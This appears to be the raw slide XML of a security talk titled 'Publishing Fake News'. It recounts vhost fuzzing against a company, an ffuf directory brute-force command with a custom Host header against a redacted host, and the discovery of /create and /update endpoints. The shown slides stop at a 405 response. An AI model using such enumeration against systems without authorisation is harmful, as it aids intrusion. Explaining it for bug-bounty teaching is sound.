                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="165" name="Shape 165"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166" name="Google Shape;166;p26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;167;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Google Shape;168;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="Google Shape;169;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="28644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 sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Had been doing an unholy amount of vhost fuzzing against a company. </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Hundreds of subdomains &amp; massive wordlists.</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>After days I eventually stumbled across:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>yzproxy.prod.k8s.cf.example.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>It responded with a different 404 page…</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Google Shape;170;p26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="174" name="Shape 174"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;175;p27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;176;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Google Shape;177;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Google Shape;178;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="28644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 sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>So, I directory brute-forced:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ffuf -u http://something.prod.redacted.com/FUZZ </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>“Host: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>xyzproxy.prod.k8s.cf.example.com”</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>Found:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>/create</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>/update</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="179" name="Google Shape;179;p27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="183" name="Shape 183"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184" name="Google Shape;184;p28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;185;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="186" name="Google Shape;186;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="187" name="Google Shape;187;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2511900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>GET /create</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>=&gt; 405 Method Not Allowed…</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
